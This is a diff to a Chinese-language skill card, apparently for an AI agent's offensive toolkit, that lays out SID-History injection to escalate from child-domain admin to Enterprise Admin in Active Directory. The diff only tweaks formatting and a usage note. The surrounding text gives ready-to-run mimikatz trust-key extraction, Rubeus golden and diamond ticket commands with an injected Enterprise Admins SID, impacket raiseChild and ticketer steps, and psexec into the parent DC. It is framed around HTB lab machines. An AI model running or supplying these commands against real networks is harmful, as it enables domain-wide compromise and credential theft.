@@ -4,7 +4,7 @@ description: 'SID-History Injection：子域→父域提权。Golden Ticket + Ex
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 ## SID-History Injection — 子域→父域/跨林提权
 
@@ -15,14 +15,14 @@ SID-History 是 AD 迁移机制，允许用户保留原域的 SID。攻击者可
 ```bash
 nltest /domain_trusts /all_trusts /v
 Get-DomainTrust  # PowerView
-```
+```text
 关键信号：`TrustAttributes: WITHIN_FOREST` + `TrustDirection: Bidirectional`
 
 ### 提取 Trust Key
 ```cmd
 mimikatz.exe "lsadump::trust /patch" "exit"
 # → [  In ]  DOMAIN$ -> PARENT_DOMAIN$  aes256_hmac: <KEY>
-```
+```text
 
 ### 攻击路径
 
@@ -30,19 +30,19 @@ mimikatz.exe "lsadump::trust /patch" "exit"
 ```cmd
 Rubeus.exe golden /aes256:<TRUST_KEY> /user:Administrator /id:500 /domain:child.domain /sid:<CHILD_SID> /sids:<PARENT_EA_SID> /ptt
 # /sids: S-1-5-21-<PARENT>-519  (Enterprise Admins)
-```
+```text
 
 #### 路径 B: Diamond Ticket + SIDHistory (更隐蔽)
 ```cmd
 Rubeus.exe diamond /tgtdeleg /krbkey:<AES256> /sids:<EA_SID> /ptt
-```
+```text
 
 #### 路径 C: raiseChild.py (impacket, 最便捷)
 ```bash
 # 需要子域 DA 权限
 impacket-raiseChild child.domain/Admin@DC.child.domain
 # 自动完成: 提取 trust key → Golden Ticket → DCSync 父域 → 输出 EA hash
-```
+```text
 
 #### 路径 D: ticketer.py + ExtraSID (手动)
 ```bash
@@ -55,8 +55,8 @@ impacket-ticketer -nthash <KRBTGT> -domain-sid <CHILD_SID> -domain child.domain 
 # 3. 使用 Ticket 访问父域
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass parent.domain/Administrator@DC.parent.domain
-```
+```text
 
 ### HTB 场景
-- 多域/多森林靶机 → 子域 DA → per2k/其他方式拿到子域 System → trust key → EA
+- 多域/多森林靶机 → 子域 DA → pre2k/其他方式拿到子域 System → trust key → EA
 - 信号：`nltest /domain_trusts` 返回多个域，`WITHIN_FOREST`
